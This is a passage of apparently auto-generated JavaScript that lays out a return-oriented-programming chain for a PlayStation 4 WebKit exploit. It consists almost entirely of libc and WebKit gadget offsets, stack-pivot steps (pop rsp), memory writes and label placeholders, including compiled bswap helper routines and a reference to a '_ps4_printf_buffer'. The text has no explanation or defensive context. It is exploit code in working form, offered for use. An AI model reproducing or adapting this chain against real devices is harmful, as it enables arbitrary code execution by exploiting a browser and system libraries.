libc_base+165442 //pop rdi
]);
//L2441:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2442:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+165784, //L2445
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+165752, //L2443
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2443:
db([0, 0]); // 0x0
set_gadgets([
libc_base+165442, //pop rdi
//L2444:
ropchain+128, //_ps4_printf_buffer
libc_base+768796 //pop rax
]);
//L2445:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+165928, //L2448
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+165896, //L2446
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+165912, //L2447
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2446:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2447:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2448:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+166016, //L2450
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L2449:
db([1, 0]); // 0x1
set_gadget(libc_base+768796,); //pop rax
//L2450:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+166064, //L2451
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2451:
db([0, 0]); // 0x0
set_gadgets([
libc_base+768796, //pop rax
//L2452:
ropchain+128, //_ps4_printf_buffer
webkit_base+2989859, //mov [rax], rcx
libc_base+713278, //pop rsi
ropchain+166136, //L2453
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2453:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+166216, //L2455
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2455:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+166272, //L2457
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2457:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+887232, //mov [rax], cl
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+166400, //L2460
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+166384, //L2459
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2459:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2460:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+166504, //L2461
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+166520, //L2462
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L2461:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2462:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+166640, //L2463
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+166624, //L2464
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L2464:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L2463:
db([0, 0]); // 0x0
//L2405:
set_gadget(libc_base+713278,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+608613, //pop rdx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+17972187, //pop r9
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+765305, //xor rax, rax
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+489696, //pop rsp
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+772328 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5236215, //and rax, rcx
libc_base+772328, //pop rcx
write_addr,
webkit_base+2989859, //mov [rax], rcx
libc_base+713278 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+740138, //mov rax, r8
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+167968, //L2465
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+489696 //pop rsp
]);
//L2465:
db([0, 0]); // 0x0
//___bswap64_var:
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+168040, //L2467
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
webkit_base+1420514 //pop r8
]);
//L2467:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+168152, //L2469
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+168168, //L2470
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
//L2468:
db([16, 0]); // 0x10
set_gadget(webkit_base+1420514,); //pop r8
//L2469:
db([0, 0]); // 0x0
set_gadget(libc_base+772328,); //pop rcx
//L2470:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+168272, //L2473
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+168256, //L2472
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2472:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2473:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+168384, //L2475
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+168416, //L2477
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+168400, //L2476
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2475:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2476:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2477:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+168520, //L2478
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+168536, //L2479
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L2478:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2479:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+168656, //L2480
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+168640, //L2481
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L2481:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L2480:
db([0, 0]); // 0x0
set_gadgets([
libc_base+713278, //pop rsi
ropchain+168744, //L2483
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+168728, //L2482
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2482:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2483:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+168848, //L2484
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+168864, //L2485
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L2484:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2485:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+168984, //L2486
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+168968, //L2487
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L2487:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L2486:
db([0, 0]); // 0x0
//___bswap32_var:
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+169056, //L2489
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
webkit_base+1420514 //pop r8
]);
//L2489:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+169168, //L2491
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+169184, //L2492
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
//L2490:
db([16, 0]); // 0x10
set_gadget(webkit_base+1420514,); //pop r8
//L2491:
db([0, 0]); // 0x0
set_gadget(libc_base+772328,); //pop rcx
//L2492:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+169288, //L2495
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+169272, //L2494
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2494:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2495:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+169448, //L2498
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+169480, //L2500
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+169432, //L2497
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+169464, //L2499
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2497:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2498:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2499:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2500:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+169640, //L2504
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+169608, //L2502
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+169624, //L2503
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2501:
db([32, 0]); // 0x20
set_gadget(libc_base+165442,); //pop rdi
//L2502:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2503:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2504:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+169760, //L2505
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+169792, //L2507
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+169776, //L2506
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2505:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2506:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2507:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+169896, //L2508
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+169912, //L2509
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L2508:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2509:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+170032, //L2510
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+170016, //L2511
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L2511:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L2510:
db([0, 0]); // 0x0
set_gadgets([
libc_base+713278, //pop rsi
ropchain+170120, //L2513
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+170104, //L2512
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2512:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2513:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+170224, //L2514
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+170240, //L2515
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L2514:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2515:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+170360, //L2516
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+170344, //L2517
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L2517:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L2516:
db([0, 0]); // 0x0
//___bswap16_var:
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+170432, //L2519
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
webkit_base+1420514 //pop r8
]);
//L2519:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+170544, //L2521
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+170560, //L2522
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
//L2520:
db([16, 0]); // 0x10
set_gadget(webkit_base+1420514,); //pop r8
//L2521:
db([0, 0]); // 0x0
set_gadget(libc_base+772328,); //pop rcx
//L2522:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+170664, //L2525
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+170648, //L2524
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2524:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2525:
db([0, 0]); // 0x0
set_gadgets([
libc_base+229840, //mov ax, [rdi]
libc_base+713278, //pop rsi
ropchain+170824, //L2530
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+170792, //L2528
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+170808, //L2529
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2527:
db([16, 0]); // 0x10
set_gadget(libc_base+165442,); //pop rdi
//L2528:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2529:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2530:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+170880, //L2531
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+165442 //pop rdi
]);
//L2531:
db([0, 0]); // 0x0
set_gadgets([
libc_base+288783, //sar edi, cl
libc_base+713278, //pop rsi
ropchain+171008, //L2534
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+171024, //L2535
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+170992, //L2533
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2533:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2534:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2535:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+171184, //L2539
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+171152, //L2537
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+171168, //L2538
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2536:
db([48, 0]); // 0x30
set_gadget(libc_base+165442,); //pop rdi
//L2537:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2538:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2539:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+171288, //L2541
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+171272, //L2540
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2540:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2541:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+772328 //pop rcx
]);
//L2542:
db([8, 0]); // 0x8
set_gadget(libc_base+768796,); //pop rax
//L2543:
db([8, 0]); // 0x8
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
